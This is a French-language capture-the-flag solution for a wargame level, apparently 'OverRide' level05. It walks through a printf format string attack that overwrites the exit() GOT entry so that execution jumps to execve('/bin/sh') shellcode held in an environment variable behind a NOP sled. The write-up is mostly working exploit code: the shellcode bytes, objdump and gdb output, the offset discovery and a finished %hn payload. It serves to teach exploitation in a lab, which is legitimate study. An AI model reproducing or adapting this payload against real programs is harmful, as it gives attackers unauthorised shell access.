# Level 05
```
export SHELLCODE=$(python -c 'print("\x90" * 2000 + "1\xc0\xb0\xbe\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80")')
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%53790x" + "%10$hn" + "%11737x" + "%11$hn")'; cat ) | ./level05
```

## Solution

Dans le code source, nous avons identifié une vulnérabilité liée à un printf() mal formaté. Cette vulnérabilité permet de réaliser une format string attack, ce qui nous offre la possibilité d’écraser l’adresse de la fonction exit() dans la **GOT (Global Offset Table)**. En procédant ainsi, nous allons pouvoir rediriger l'exécution du programme vers du code arbitraire, notamment un shellcode que nous injecterons dans une variable d’environnement.

Tout d'abord, nous devons récupérer l'adresse de la fonction exit() dans la GOT. Cela peut être fait à l'aide de l'outil objdump, qui permet de visualiser les tables de relocation dynamiques. En exécutant la commande suivante :
```
    level05@OverRide:~$ objdump -R ./level05 
    ./level05:     file format elf32-i386
    DYNAMIC RELOCATION RECORDS
    OFFSET   TYPE              VALUE 
    080497c4 R_386_GLOB_DAT    __gmon_start__
    080497f0 R_386_COPY        stdin
    080497d4 R_386_JUMP_SLOT   printf
    080497d8 R_386_JUMP_SLOT   fgets
    080497dc R_386_JUMP_SLOT   __gmon_start__
    080497e0 R_386_JUMP_SLOT   exit
    080497e4 R_386_JUMP_SLOT   __libc_start_main
```

**adresse de exit : 080497e0**

Ensuite recuperons l'offset de la variable overwrittable avec printf format exploit :

```
    level05@OverRide:~$ python -c'print("AAAA" + " %p" * 20)' | ./level05 
    aaaa 0x64 0xf7fcfac0 0xf7ec3af9 0xffffceef 0xffffceee (nil) 0xffffffff 0xffffcf74 0xf7fdb000 0x61616161 
    0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
```

**AAAA est en 10eme position**

**offset : 10**


Maintenant recuperons l'adresse de notre shellcode

en premier il faut set notre shellcode pour la precision on va utiliser des **NOP sled** ce qui aura pour effet que d'augmenter la precision de notre payload en visant une range d'adresse pluto qu'une adresse precise, tan que l'adresse sur laquel il pointe est dans le sled le processeur passera a l'instruction suivante et glissera comme cela jusqua notre shellcode

```
    export SHELLCODE=$(python -c 'print("\x90" * 2000 + "1\xc0\xb0\xbe\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80")')

    level05@OverRide:~$ gdb ./level05 
    (gdb) b main
    Breakpoint 1 at 0x8048449
    (gdb) run 
    Starting program: /home/users/level05/level05 

    (gdb) call (char *) getenv("SHELLCODE")
    $1 = 0xffffd0fa "\220\220\220\220\220\220\220\220\220"...
```

On utilisera une adresse dans le NO sled pour la precision donc :

**adresse du shellcode : 0xffffd0fa = 4294955258 + 300(padding pour tomber dans un no sled) = 0xffffd226**

Pour pouvoir faire notre payload on va utiliser une derniere technique car comme l'adresse 0xffffd226 est egale a 4294955558 cela fait beaucoup de caractere, cela risque de prendre enormement de temps, voir d' echouer donc on va print sur les partie haute et basse de l'adresse de exit

```
    d226 = 53798
    ffff = 65535

    padding adress basse    : 
    53798 - 8       = 53790
    padding adress haute    : 
    65535 - 53798   = 11737
```

### Payload

**[Adress de exit] + [Adress de exit + 2] + [padding adress basse - 8 pour les deux adress deja print] + [offset de exit] + [padding adress haute - padding adress basse] + [deuxieme offset de exit]**

```
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%53790x" + "%10$hn" + "%11737x" + "%11$hn")'; cat ) | ./level05
```